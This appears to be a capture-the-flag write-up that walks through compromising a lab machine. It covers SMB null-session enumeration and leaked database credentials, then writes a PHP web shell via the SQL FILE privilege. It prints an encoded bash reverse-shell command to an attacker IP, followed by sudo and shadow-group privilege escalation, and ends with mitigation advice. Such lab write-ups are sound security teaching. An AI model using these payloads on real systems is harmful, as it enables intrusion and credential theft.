# **Hack10-Alumni-V2**

## **Reconnaissance & Enumeration**

The attack began with a standard **Nmap** scan to identify open ports and services.

<img width="933" height="559" alt="image" src="https://github.com/user-attachments/assets/e4247d5a-2cab-4c08-a9b1-8b3bcfb7f455" />

**Findings:**

- **Port 80:** Web server (Apache/Nginx).
- **Port 445:** SMB (Samba) service.
- **Port 41223:** Custom Go-based service.

### **SMB Enumeration**

Using `smbclient`, I explored the target’s shares and found a **Null Session** (anonymous access) was allowed on the `public` share.

<img width="938" height="698" alt="image" src="https://github.com/user-attachments/assets/2cdf141a-b401-46a9-a698-580f7a30c8da" />

Inside the share, I found a sensitive backup file: `config.php.bak`. Downloading and reading it revealed hardcoded database credentials:

- **DB User:** `root`
- **DB Password:** `AlumniDB!2026`

## **Initial Access (SQL to Web Shell)**

I navigated to `http://192.168.0.46/adminer.php`, a database management tool discovered during directory brute-forcing. Using the credentials found in the SMB share, I logged into the **MariaDB** instance.

<img width="853" height="415" alt="image" src="https://github.com/user-attachments/assets/f62c57fa-0756-420b-882e-f5512bfad515" />

### **Exploiting the `FILE` Privilege**

Knowing that the `mysql` user had the ability to write to the filesystem, I used the **SQL Command** interface to drop a PHP web shell into the web root:

<img width="959" height="372" alt="image" src="https://github.com/user-attachments/assets/aa310703-71db-4fa5-8225-562ef3876426" />

<img width="566" height="72" alt="image" src="https://github.com/user-attachments/assets/c6a0a813-70b1-4a29-a90d-391300ea2da9" />

### **Triggering the Reverse Shell**

After verifying the shell via browser (`http://192.168.0.46/shell1.php?cmd=id`), I established a listener on my Kali machine and executed a bash reverse shell:

<img width="351" height="57" alt="image" src="https://github.com/user-attachments/assets/b73ba506-8627-4f17-b384-deb36970c808" />

**Encoded Payload** 

```sql
http://192.168.0.46/shell1.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.47%2F4444%200%3E%261%22
```

<img width="952" height="151" alt="image" src="https://github.com/user-attachments/assets/bb3c0832-b2b3-4b20-a5d5-4e06589653a6" />

**Result:** Established a shell as `www-data`.

<img width="926" height="120" alt="image" src="https://github.com/user-attachments/assets/3bcb4f68-7115-40b5-b3bc-3cefb6cfb066" />

### **Sudo Exploitation**

Checking current privileges with `sudo -l`, I discovered that `www-data` could run a specific script as the `alumni` user without a password:

<img width="889" height="175" alt="image" src="https://github.com/user-attachments/assets/acbbee42-d332-4443-9133-e2f8ae3f7316" />

I executed the script to pivot to the higher-privileged user:

<img width="931" height="37" alt="image" src="https://github.com/user-attachments/assets/fa8f037b-47e8-4890-bbca-5eb3705f4fab" />

```sql
sudo -u alumni /usr/bin/python3 /opt/scripts/health_check.py
```

### **Claiming the User Flag**

With `alumni` access, I was able to read the first flag:

<img width="895" height="47" alt="image" src="https://github.com/user-attachments/assets/f9f60f47-762b-484f-989a-0734acc077e8" />

<img width="663" height="88" alt="image" src="https://github.com/user-attachments/assets/33c78f14-e7ad-4609-a267-1bb45be109d8" />

## Privilege Escalation (Root)

The final escalation to root was made possible by an insecure group assignment.

### **Shadow Group Exploitation**

The `id` command revealed that the `alumni` user was a member of the **`shadow`** group

<img width="835" height="49" alt="image" src="https://github.com/user-attachments/assets/75e43592-9ec7-45b7-ade9-b8d5fd156600" />

This allowed the user to read the encrypted password hashes in **`/etc/shadow`**.
****

### **Cracking the Root Hash**

The root hash was exfiltrated and cracked using **John the Ripper** and the `rockyou.txt` wordlist.

<img width="921" height="241" alt="image" src="https://github.com/user-attachments/assets/7820dae1-6a10-4077-bc8e-861321597c97" />

### **Root Access**

Using the cracked credentials, root access was established:

<img width="694" height="113" alt="image" src="https://github.com/user-attachments/assets/af5258c4-8319-4dc5-90f3-75809c9aac4f" />

<img width="677" height="65" alt="image" src="https://github.com/user-attachments/assets/b5e80a8b-3ce1-4d2e-b60c-7e0ca666490b" />

### **Recommendations & Mitigations**

1. **Restrict SMB Access:** Disable Null Sessions and anonymous access to internal file shares.
2. **Database Hardening:** Disable the `FILE` privilege for web-facing database users and set a directory for `secure_file_priv`.
3. **Audit Group Memberships:** Remove non-administrative users from sensitive groups like `shadow`, `disk`, or `docker`.
4. **Credential Management:** Ensure that root and service passwords are complex and not stored in plaintext backup files.
